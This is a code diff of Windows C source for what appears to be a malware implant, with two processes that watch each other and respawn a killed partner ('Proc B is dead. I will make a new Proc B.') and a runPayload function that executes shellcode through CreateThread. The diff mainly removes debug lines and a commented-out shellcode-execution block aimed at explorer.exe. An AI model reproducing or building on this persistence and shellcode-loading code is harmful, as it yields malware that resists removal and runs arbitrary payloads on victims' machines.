@@ -37,7 +37,6 @@ int startAndMonitorPartner(){
 	DPRINT("startAndMonitorPartner\n");
 	
 	ownPsuedoHandle = GetCurrentProcess();
-	//OpenProcess(PROCESS_DUP_HANDLE, FALSE, GetCurrentProcessId());//GetCurrentProcess();
 	// this API does not fail
 
 	// Send the handle over
@@ -51,7 +50,7 @@ int startAndMonitorPartner(){
 		switch (waitResult) {
 			case WAIT_OBJECT_0:
 				// Start the partner process
-				DPRINT("Start partner process\n");
+				DPRINT("Proc B is dead. I will make a new Proc B.\n");
 				retVal = CreateProcessW(
 					L"D:\\TRIPLE_P.exe",
 					NULL,//L"D:\\pay.dat",
@@ -88,17 +87,10 @@ int startAndMonitorPartner(){
 				break;
 		}
 
-		WHEREAMI;
-
 		// Do I actually need to write to the memory each cycle?
 		// No, but this ensures that the write event is set, which is req'd for the other thread to run
 		retVal = writeNamedMemory(&dupHandle, sizeof(dupHandle), &sharedMem);
 		CHECK_RETVAL(retVal, "writeNamedMemory");
-
-		void* tmpbuf = NULL;
-		unsigned long tmpsize = 0;
-		readNamedMemory(&sharedMem, &tmpbuf, &tmpsize);
-		DPRINT("tmpbuf: %lu\n", *(unsigned long long*)tmpbuf);
 
 		waitResult = WaitForSingleObject(pi.hProcess, 5000);
 	}
@@ -134,18 +126,13 @@ int findAndMonitorPartner(){
 		SET_RETVAL(retVal, "readNamedMemoryOnEvent", UNKNOWN_ERROR);
 	}
 
-	// TODO: Tmp code, remove me
-	DPRINT("Handle %u\n", (unsigned long long)mainProc);
-	DPRINT("Found %u\n", GetProcessId(mainProc));
-
 	waitResult = WaitForSingleObject(mainProc, INFINITE);
 	switch (waitResult) {
 			case WAIT_OBJECT_0:
 				// Start the partner process
-				DPRINT("Start partner process again\n");
-				retVal = startAndMonitorPartner();
-				CHECK_RETVAL(retVal, "startAndMonitorPartner");
-				break;
+				// If Proc A is dead and this thread exits, the master thread will get the ProcA mutex and run those functions
+				DPRINT("Proc A died. I will become Proc A.\n");
+				goto CLEANUP;
 			case WAIT_TIMEOUT:
 				// Do routine checks here. Not sure what they are yet.
 				break;
@@ -183,10 +170,6 @@ int runPayload(char* payloadData, HANDLE* implantHandle){
 	*implantHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)payloadData, NULL, 0, 0);
 	Sleep(1000); // Wait a bit for the thread to kick off
 	CHECK_RETVAL_GLE(retVal, "CreateThread", *implantHandle, NULL);
-	/*if(!*implantHandle){
-		retVal = EXEC_ERROR_RUN;
-		CHECK_RETVAL(retVal, "CreateThread", retVal);
-	}*/
 
 	DPRINT("Success\n");
 CLEANUP:
@@ -195,17 +178,12 @@ CLEANUP:
 
 int main(){
     int retVal = NO_ERROR;
-	//int pid = 0;
 	
 	HANDLE aEvent = NULL;
 	HANDLE bEvent = NULL;
 	HANDLE procA = NULL;
 	unsigned long waitResult = 0;
 	int whoAmI = 0;
-
-	//char* payloadData = NULL;
-	//int payloadLen = 0;
-	//HANDLE payloadHandle = NULL;
 
 	HANDLE monitorHandle = NULL;
 
@@ -214,29 +192,11 @@ int main(){
 	void* shellcodeView = NULL;
 	HANDLE implantHandle = NULL;
 
-	/*
-	// Assumes only one user is logged in
-	retVal = GetPidByName(L"explorer.exe", &pid);
-	CHECK_RETVAL(retVal, "GetPidByName");
-
-	printf("PID: %d\n", pid);
-
-	DPRINT("\n--- Vanilla Shellcode Exec ---\n");
-	retVal = getPayload(SHELLCODE_FILE, &payloadData, &payloadLen);
-	CHECK_RETVAL(retVal, "getPayload");
-
-	retVal = processPayload(payloadData, payloadLen);
-	CHECK_RETVAL(retVal, "processPayload");
-
-	retVal = runPayload(payloadData, &payloadHandle);
-	CHECK_RETVAL(retVal, "runPayload");
-	*/
-
 	// Create the mutexes
 	procA = CreateMutexW(NULL, FALSE, MUTEX_NAME);
 	CHECK_RETVAL_GLE(retVal, "CreateEvent", procA, NULL);
 
-	aEvent = CreateEventW(NULL, FALSE, FALSE, EVENTA_NAME);
+	aEvent = CreateEventW(NULL, TRUE, FALSE, EVENTA_NAME);
 	CHECK_RETVAL_GLE(retVal, "CreateEvent", aEvent, NULL);
 
 	bEvent = CreateEventW(NULL, FALSE, FALSE, EVENTB_NAME);
@@ -244,7 +204,7 @@ int main(){
 
 	while(TRUE){
 	// Try and determine which process this will be
-		waitResult = WaitForSingleObject(procA, 1000);
+		waitResult = WaitForSingleObject(procA, 500);
 		switch (waitResult) {// case fall-throughs are intentional
 			case WAIT_ABANDONED:
 			case WAIT_OBJECT_0:
@@ -303,7 +263,7 @@ int main(){
 			retVal = SetEvent(aEvent);
 			CHECK_RETVAL_GLE(retVal, "SetEvent", retVal, 0);
 
-			// Wait for procB to finish
+			// Watch the procA thread to keep it alive
 			waitResult = WaitForSingleObject(monitorHandle, INFINITE);
 		} else if (whoAmI == 2) {
 				retVal = SetEvent(bEvent);
